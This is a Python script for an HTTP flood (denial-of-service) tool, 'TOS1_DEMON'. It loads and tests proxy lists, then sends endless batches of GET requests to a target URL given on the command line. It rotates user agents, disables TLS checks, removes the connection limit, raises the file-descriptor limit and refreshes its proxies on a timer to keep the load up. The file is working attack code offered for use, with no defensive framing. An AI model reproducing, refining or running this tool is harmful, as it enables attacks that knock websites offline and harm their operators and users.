import asyncio
import aiohttp
import time
import random
import os
import sys

class TOS1_DEMON:
    def __init__(self, target_url):
        self.target_url = target_url
        self.total_requests = 0
        self.session_id = "S023"
        self.demon_id = "TØS-RR"
        self.maintenance_status = ""
        
        # PROXY SYSTEM
        self.working_proxies = []
        self.proxy_files = ['h1.txt', 'h2.txt']
        
        # HEADERS
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15'
        ]
        
        self.device_ids = ['550e8400-e29b-41d4-a716-446655440000']
        
        # CONTROL
        self.running = True
        self.maintenance_mode = False
        self.last_maintenance = time.time()
        self.maintenance_interval = 900
        
        # STATS
        self.start_time = time.time()
        self.current_rps = 0
        self.requests_since_last = 0
        self.last_rps_calc = time.time()
        
        # SESSIONS
        self.session = None
        self.proxy_session = None

    def load_proxies(self):
        """Load proxies from files"""
        all_proxies = []
        
        for file in self.proxy_files:
            try:
                if os.path.exists(file):
                    with open(file, 'r') as f:
                        proxies = [line.strip() for line in f if line.strip()]
                        all_proxies.extend(proxies[:200])  # Limit to 200 per file
            except:
                pass
        
        return list(set(all_proxies))

    async def test_proxy_single(self, proxy, session):
        """Test single proxy"""
        try:
            async with session.get(
                self.target_url,
                proxy=f"http://{proxy}" if proxy else None,
                timeout=aiohttp.ClientTimeout(total=2),
                ssl=False
            ) as response:
                if response.status < 500:
                    return proxy
        except:
            pass
        return None

    async def find_working_proxies(self):
        """Find working proxies - FIXED ASYNC"""
        print("\n[~] Finding working proxies (max 15s)...")
        
        # Get proxies
        all_proxies = self.load_proxies()
        
        if not all_proxies:
            print("[!] No proxies in files, using direct")
            self.working_proxies = [None]
            return
        
        # Limit to 200 for testing
        test_proxies = all_proxies[:200]
        print(f"[+] Testing {len(test_proxies)} proxies")
        
        # Create session for testing
        connector = aiohttp.TCPConnector(limit=20, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            # Create tasks
            tasks = []
            for proxy in test_proxies:
                task = asyncio.create_task(self.test_proxy_single(proxy, session))
                tasks.append(task)
            
            # Wait with timeout
            done, pending = await asyncio.wait(tasks, timeout=15.0)
            
            # Get results
            working = []
            for task in done:
                try:
                    result = await task
                    if result:
                        working.append(result)
                except:
                    pass
            
            # Cancel pending
            for task in pending:
                task.cancel()
        
        self.working_proxies = working if working else [None]
        print(f"[+] Found {len(self.working_proxies)} working proxies")

    def get_proxy(self):
        """Get random proxy"""
        if not self.working_proxies:
            return None
        
        proxy = random.choice(self.working_proxies)
        return f"http://{proxy}" if proxy else None

    def get_headers(self):
        """Generate headers"""
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': '*/*',
            'Connection': 'keep-alive'
        }

    async def send_request(self):
        """Send one request"""
        proxy = self.get_proxy()
        headers = self.get_headers()
        
        try:
            if proxy:
                async with self.session.get(
                    self.target_url,
                    headers=headers,
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=3),
                    ssl=False
                ) as response:
                    await response.read()
            else:
                async with self.session.get(
                    self.target_url,
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=3),
                    ssl=False
                ) as response:
                    await response.read()
                    
        except:
            pass
        finally:
            self.total_requests += 1
            self.requests_since_last += 1

    async def attack_loop(self):
        """Main attack loop"""
        connector = aiohttp.TCPConnector(limit=0, ssl=False)
        self.session = aiohttp.ClientSession(connector=connector)
        
        try:
            while self.running and not self.maintenance_mode:
                # Send multiple requests per iteration
                tasks = []
                for _ in range(10):  # 10 requests per batch
                    task = asyncio.create_task(self.send_request())
                    tasks.append(task)
                
                # Wait for batch
                await asyncio.gather(*tasks, return_exceptions=True)
                
                # Small yield
                await asyncio.sleep(0.001)
                
        finally:
            await self.session.close()

    def calculate_rps(self):
        """Calculate RPS"""
        now = time.time()
        time_diff = now - self.last_rps_calc
        
        if time_diff >= 0.001:
            self.current_rps = self.requests_since_last / time_diff
            self.requests_since_last = 0
            self.last_rps_calc = now

    def update_display(self):
        """Update display"""
        self.calculate_rps()
        
        # Maintenance status
        if self.maintenance_mode:
            self.maintenance_status = "TØS-MAINTENACE"
        else:
            time_left = self.maintenance_interval - (time.time() - self.last_maintenance)
            if time_left < 60:
                self.maintenance_status = f"M-{int(time_left)}s"
            else:
                self.maintenance_status = f"M-{int(time_left/60)}m"
        
        # ONLY LOG
        sys.stdout.write(f'\rTØS-TRS — {self.total_requests} | {{{self.session_id}, {self.demon_id}, {self.maintenance_status}}}')
        sys.stdout.flush()

    async def maintenance(self):
        """Maintenance"""
        self.maintenance_mode = True
        await asyncio.sleep(1)
        
        # Refresh proxies
        await self.find_working_proxies()
        
        self.maintenance_mode = False
        self.last_maintenance = time.time()
        
        # Clear screen
        sys.stdout.write('\033[2J\033[H')
        sys.stdout.flush()

    async def maintenance_checker(self):
        """Check for maintenance"""
        while self.running:
            if time.time() - self.last_maintenance >= self.maintenance_interval:
                await self.maintenance()
            await asyncio.sleep(1)

    async def display_updater(self):
        """Update display"""
        while self.running:
            self.update_display()
            await asyncio.sleep(0.001)

    async def run(self):
        """Main run method"""
        # Initial
        sys.stdout.write('\033[2J\033[H')
        sys.stdout.flush()
        print("𝖳Ø𝖲-1 | 𝖲023")
        await asyncio.sleep(2)
        sys.stdout.write('\033[2J\033[H')
        sys.stdout.flush()
        
        # Find proxies
        await self.find_working_proxies()
        
        # Run everything
        await asyncio.gather(
            self.attack_loop(),
            self.maintenance_checker(),
            self.display_updater(),
            return_exceptions=True
        )

def main():
    if len(sys.argv) != 2:
        sys.exit(1)
    
    target = sys.argv[1]
    
    # Set high limits
    import resource
    try:
        resource.setrlimit(resource.RLIMIT_NOFILE, (8192, 8192))
    except:
        pass
    
    # Create and run
    demon = TOS1_DEMON(target)
    
    try:
        asyncio.run(demon.run())
    except KeyboardInterrupt:
        runtime = time.time() - demon.start_time
        avg_rps = demon.total_requests / runtime if runtime > 0 else 0
        print(f"\n\nTOTAL: {demon.total_requests} | AVG RPS: {avg_rps:.1f}")
    except Exception as e:
        print(f"\nError: {str(e)}")

if __name__ == "__main__":
    main()
